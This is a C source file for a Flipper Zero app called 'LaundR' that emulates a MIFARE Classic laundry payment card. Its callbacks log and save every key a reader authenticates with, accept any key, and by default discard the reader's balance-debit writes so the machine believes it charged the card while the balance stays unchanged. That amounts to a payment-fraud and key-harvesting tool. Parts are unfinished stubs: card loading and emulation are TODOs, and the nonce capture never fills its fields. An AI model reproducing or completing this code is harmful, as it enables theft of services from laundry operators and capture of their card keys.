#include <furi.h>
#include <furi_hal.h>
#include <gui/gui.h>
#include <gui/view_dispatcher.h>
#include <gui/scene_manager.h>
#include <gui/modules/submenu.h>
#include <gui/modules/text_input.h>
#include <gui/modules/widget.h>
#include <nfc/nfc.h>
#include <nfc/nfc_device.h>
#include <nfc/protocols/mf_classic/mf_classic.h>
#include <storage/storage.h>

#define TAG "LaundR"

// Forward declarations
static void save_captured_key(uint8_t sector, MfClassicKeyType key_type, MfClassicKey* key);

// Transaction log entry
typedef struct {
    uint8_t block_num;
    uint8_t operation; // 0=read, 1=write, 2=auth
    uint8_t data[16];
    uint32_t timestamp;
} TransactionLogEntry;

// Nonce capture for mfkey32 key recovery
typedef struct {
    uint8_t sector;
    MfClassicKeyType key_type;
    uint32_t nt;      // Tag nonce
    uint32_t nr;      // Reader nonce (encrypted)
    uint32_t ar;      // Reader response (encrypted)
    uint32_t at;      // Tag response (optional)
    bool valid;
} CapturedNonce;

// App state
typedef struct {
    Gui* gui;
    ViewDispatcher* view_dispatcher;
    Submenu* submenu;
    Widget* widget;
    Storage* storage;

    // NFC device data
    NfcDevice* nfc_dev;
    MfClassicData* card_data;

    // Emulation state
    bool emulating;
    bool apply_changes; // If false, ignore writes (testing mode)

    // Transaction log
    TransactionLogEntry log[64];
    uint8_t log_count;

    // Nonce capture for key recovery
    CapturedNonce nonces[32];
    uint8_t nonce_count;

    // Original balance (for comparison)
    uint16_t original_balance;
    uint16_t current_balance;

    // Statistics
    uint32_t read_count;
    uint32_t write_count;
    uint32_t auth_count;
    uint32_t auth_fail_count;  // Failed auths = potential nonce captures
} LaundRApp;

// View IDs
typedef enum {
    LaundRViewSubmenu,
    LaundRViewWidget,
} LaundRView;

// Submenu items
typedef enum {
    LaundRSubmenuLoad,
    LaundRSubmenuEmulate,
    LaundRSubmenuToggleMode,
    LaundRSubmenuSaveKeys,
    LaundRSubmenuViewLog,
    LaundRSubmenuExit,
} LaundRSubmenuIndex;

// ============================================================================
// NFC EMULATION CALLBACKS
// ============================================================================

// Called when reader tries to read a block
static bool laundr_read_callback(
    uint8_t block_num,
    MfClassicKey key,
    MfClassicKeyType key_type,
    MfClassicBlock* block_data,
    void* context) {

    LaundRApp* app = (LaundRApp*)context;

    FURI_LOG_I(TAG, "Reader READ Block %d", block_num);

    // Log the read operation
    if(app->log_count < 64) {
        app->log[app->log_count].block_num = block_num;
        app->log[app->log_count].operation = 0; // read
        app->log[app->log_count].timestamp = furi_get_tick();
        memcpy(app->log[app->log_count].data, block_data->data, 16);
        app->log_count++;
    }

    app->read_count++;

    // Return true to allow the read
    return true;
}

// Called when reader tries to write a block
static bool laundr_write_callback(
    uint8_t block_num,
    MfClassicKey key,
    MfClassicKeyType key_type,
    MfClassicBlock* block_data,
    void* context) {

    LaundRApp* app = (LaundRApp*)context;

    FURI_LOG_I(TAG, "Reader WRITE Block %d", block_num);

    // Log the write operation
    if(app->log_count < 64) {
        app->log[app->log_count].block_num = block_num;
        app->log[app->log_count].operation = 1; // write
        app->log[app->log_count].timestamp = furi_get_tick();
        memcpy(app->log[app->log_count].data, block_data->data, 16);
        app->log_count++;
    }

    app->write_count++;

    // If writing to Block 4 or 8 (balance blocks), decode the balance
    if(block_num == 4 || block_num == 8) {
        uint16_t new_balance = (block_data->data[1] << 8) | block_data->data[0];

        FURI_LOG_I(
            TAG,
            "Balance change detected: Block %d: $%.2f -> $%.2f",
            block_num,
            app->current_balance / 100.0,
            new_balance / 100.0);

        app->current_balance = new_balance;
    }

    // CRITICAL: This is where we decide whether to apply the write
    if(app->apply_changes) {
        FURI_LOG_I(TAG, "APPLYING write to Block %d", block_num);
        // Allow the write to be applied to our emulated card
        return true;
    } else {
        FURI_LOG_W(TAG, "IGNORING write to Block %d (testing mode)", block_num);
        // Reject the write - card state doesn't change
        // Reader thinks it succeeded, but card balance stays the same!
        return false; // or return true but don't update internal state
    }
}

// Called when reader tries to authenticate
static bool laundr_auth_callback(
    uint8_t block_num,
    MfClassicKey* key,
    MfClassicKeyType key_type,
    void* context) {

    LaundRApp* app = (LaundRApp*)context;
    uint8_t sector = block_num / 4;

    // Log the key the reader is trying to use
    FURI_LOG_I(
        TAG,
        "Reader AUTH Block %d Sector %d (Key %s): %02X%02X%02X%02X%02X%02X",
        block_num,
        sector,
        key_type == MfClassicKeyTypeA ? "A" : "B",
        key->data[0], key->data[1], key->data[2],
        key->data[3], key->data[4], key->data[5]);

    app->auth_count++;

    // Capture the key attempt for analysis
    if(app->nonce_count < 32) {
        CapturedNonce* nonce = &app->nonces[app->nonce_count];
        nonce->sector = sector;
        nonce->key_type = key_type;
        nonce->valid = true;
        app->nonce_count++;

        FURI_LOG_I(TAG, "*** CAPTURED AUTH #%d: Sector %d Key%s ***",
            app->nonce_count, sector,
            key_type == MfClassicKeyTypeA ? "A" : "B");

        // Special alert for KeyB (write key!)
        if(key_type == MfClassicKeyTypeB) {
            FURI_LOG_W(TAG, "!!! WRITE KEY ATTEMPT DETECTED !!!");
            FURI_LOG_W(TAG, "!!! KeyB for Sector %d: %02X%02X%02X%02X%02X%02X !!!",
                sector,
                key->data[0], key->data[1], key->data[2],
                key->data[3], key->data[4], key->data[5]);
        }
    }

    // Save the captured key for later
    save_captured_key(sector, key_type, key);

    // Always allow authentication with whatever key reader uses
    // This lets the reader proceed so we can capture write attempts
    return true;
}

// ============================================================================
// KEY CAPTURE & SAVE
// ============================================================================

// Captured keys storage
static uint8_t captured_keys[16][6];  // Up to 16 unique keys
static uint8_t captured_key_count = 0;
static uint8_t captured_key_sectors[16];
static MfClassicKeyType captured_key_types[16];

static void save_captured_key(uint8_t sector, MfClassicKeyType key_type, MfClassicKey* key) {
    // Check if we already have this key
    for(int i = 0; i < captured_key_count; i++) {
        if(memcmp(captured_keys[i], key->data, 6) == 0) {
            return; // Already have it
        }
    }

    // Add new key
    if(captured_key_count < 16) {
        memcpy(captured_keys[captured_key_count], key->data, 6);
        captured_key_sectors[captured_key_count] = sector;
        captured_key_types[captured_key_count] = key_type;
        captured_key_count++;
        FURI_LOG_W(TAG, "=== NEW KEY CAPTURED (#%d) ===", captured_key_count);
    }
}

static void save_keys_to_file(Storage* storage) {
    if(captured_key_count == 0) {
        FURI_LOG_I(TAG, "No keys to save");
        return;
    }

    File* file = storage_file_alloc(storage);
    if(storage_file_open(file, "/ext/nfc/laundr_captured_keys.txt",
        FSAM_WRITE, FSOM_CREATE_ALWAYS)) {

        char buffer[128];
        int len = snprintf(buffer, sizeof(buffer),
            "# LaundR Captured Keys\n# Sector:KeyType:Key\n");
        storage_file_write(file, buffer, len);

        for(int i = 0; i < captured_key_count; i++) {
            len = snprintf(buffer, sizeof(buffer),
                "S%d:Key%s:%02X%02X%02X%02X%02X%02X\n",
                captured_key_sectors[i],
                captured_key_types[i] == MfClassicKeyTypeA ? "A" : "B",
                captured_keys[i][0], captured_keys[i][1], captured_keys[i][2],
                captured_keys[i][3], captured_keys[i][4], captured_keys[i][5]);
            storage_file_write(file, buffer, len);
        }

        storage_file_close(file);
        FURI_LOG_I(TAG, "Saved %d keys to laundr_captured_keys.txt", captured_key_count);
    }
    storage_file_free(file);
}

// ============================================================================
// UI CALLBACKS
// ============================================================================

static void laundr_submenu_callback(void* context, uint32_t index) {
    LaundRApp* app = (LaundRApp*)context;

    switch(index) {
    case LaundRSubmenuLoad:
        // TODO: Load .nfc file
        FURI_LOG_I(TAG, "Load card selected");
        break;

    case LaundRSubmenuEmulate:
        // TODO: Start emulation
        FURI_LOG_I(TAG, "Emulate selected");
        app->emulating = true;
        break;

    case LaundRSubmenuToggleMode:
        // Toggle between testing mode and normal mode
        app->apply_changes = !app->apply_changes;
        FURI_LOG_I(
            TAG,
            "Mode: %s",
            app->apply_changes ? "NORMAL (apply writes)" : "TESTING (ignore writes)");
        break;

    case LaundRSubmenuSaveKeys:
        // Save captured keys to file
        save_keys_to_file(app->storage);
        FURI_LOG_I(TAG, "Saved %d captured keys to /ext/nfc/laundr_captured_keys.txt", captured_key_count);
        break;

    case LaundRSubmenuViewLog:
        FURI_LOG_I(TAG, "View log - %d auth events, %d keys captured", app->auth_count, captured_key_count);
        break;

    case LaundRSubmenuExit:
        // Save keys before exit
        save_keys_to_file(app->storage);
        view_dispatcher_stop(app->view_dispatcher);
        break;
    }
}

static void laundr_draw_callback(Canvas* canvas, void* context) {
    LaundRApp* app = (LaundRApp*)context;

    canvas_clear(canvas);
    canvas_set_font(canvas, FontPrimary);

    canvas_draw_str(canvas, 2, 10, "LaundR Key Capture v1.1");

    canvas_set_font(canvas, FontSecondary);

    char buffer[64];

    // Show captured keys count (most important!)
    snprintf(buffer, sizeof(buffer), "Keys Captured: %d", captured_key_count);
    canvas_draw_str(canvas, 2, 22, buffer);

    // Show mode
    snprintf(
        buffer,
        sizeof(buffer),
        "Mode: %s",
        app->apply_changes ? "NORMAL" : "TESTING");
    canvas_draw_str(canvas, 2, 32, buffer);

    // Show balance
    snprintf(
        buffer,
        sizeof(buffer),
        "Balance: $%.2f",
        app->current_balance / 100.0);
    canvas_draw_str(canvas, 2, 42, buffer);

    // Show auth count
    snprintf(buffer, sizeof(buffer), "Auths: %lu  R:%lu W:%lu",
        app->auth_count, app->read_count, app->write_count);
    canvas_draw_str(canvas, 2, 52, buffer);

    // Status
    if(app->emulating) {
        canvas_draw_str(canvas, 2, 64, "EMULATING - Hold to reader!");
    } else {
        canvas_draw_str(canvas, 2, 64, "Status: IDLE");
    }
}

// ============================================================================
// APP LIFECYCLE
// ============================================================================

static LaundRApp* laundr_app_alloc() {
    LaundRApp* app = malloc(sizeof(LaundRApp));

    app->gui = furi_record_open(RECORD_GUI);
    app->storage = furi_record_open(RECORD_STORAGE);

    // Create view dispatcher
    app->view_dispatcher = view_dispatcher_alloc();
    view_dispatcher_enable_queue(app->view_dispatcher);
    view_dispatcher_attach_to_gui(app->view_dispatcher, app->gui, ViewDispatcherTypeFullscreen);

    // Create submenu
    app->submenu = submenu_alloc();
    submenu_add_item(
        app->submenu,
        "Load Card",
        LaundRSubmenuLoad,
        laundr_submenu_callback,
        app);
    submenu_add_item(
        app->submenu,
        "Start Emulation",
        LaundRSubmenuEmulate,
        laundr_submenu_callback,
        app);
    submenu_add_item(
        app->submenu,
        "Toggle Mode",
        LaundRSubmenuToggleMode,
        laundr_submenu_callback,
        app);
    submenu_add_item(
        app->submenu,
        "Save Captured Keys",
        LaundRSubmenuSaveKeys,
        laundr_submenu_callback,
        app);
    submenu_add_item(
        app->submenu,
        "View Log",
        LaundRSubmenuViewLog,
        laundr_submenu_callback,
        app);
    submenu_add_item(
        app->submenu,
        "Exit",
        LaundRSubmenuExit,
        laundr_submenu_callback,
        app);

    view_dispatcher_add_view(
        app->view_dispatcher,
        LaundRViewSubmenu,
        submenu_get_view(app->submenu));

    // Create widget for emulation view
    app->widget = widget_alloc();
    widget_add_string_element(
        app->widget,
        64,
        10,
        AlignCenter,
        AlignTop,
        FontPrimary,
        "Emulating Card");

    // Initialize state
    app->emulating = false;
    app->apply_changes = false; // Default to testing mode
    app->log_count = 0;
    app->nonce_count = 0;
    app->read_count = 0;
    app->write_count = 0;
    app->auth_count = 0;
    app->auth_fail_count = 0;
    app->original_balance = 0;
    app->current_balance = 0;

    // Reset captured keys
    captured_key_count = 0;

    return app;
}

static void laundr_app_free(LaundRApp* app) {
    view_dispatcher_remove_view(app->view_dispatcher, LaundRViewSubmenu);
    submenu_free(app->submenu);
    widget_free(app->widget);
    view_dispatcher_free(app->view_dispatcher);

    furi_record_close(RECORD_STORAGE);
    furi_record_close(RECORD_GUI);

    free(app);
}

// ============================================================================
// MAIN ENTRY POINT
// ============================================================================

int32_t laundr_app(void* p) {
    UNUSED(p);

    FURI_LOG_I(TAG, "Starting Laundry Tester app");

    LaundRApp* app = laundr_app_alloc();

    view_dispatcher_switch_to_view(app->view_dispatcher, LaundRViewSubmenu);
    view_dispatcher_run(app->view_dispatcher);

    laundr_app_free(app);

    FURI_LOG_I(TAG, "Laundry Tester app stopped");

    return 0;
}
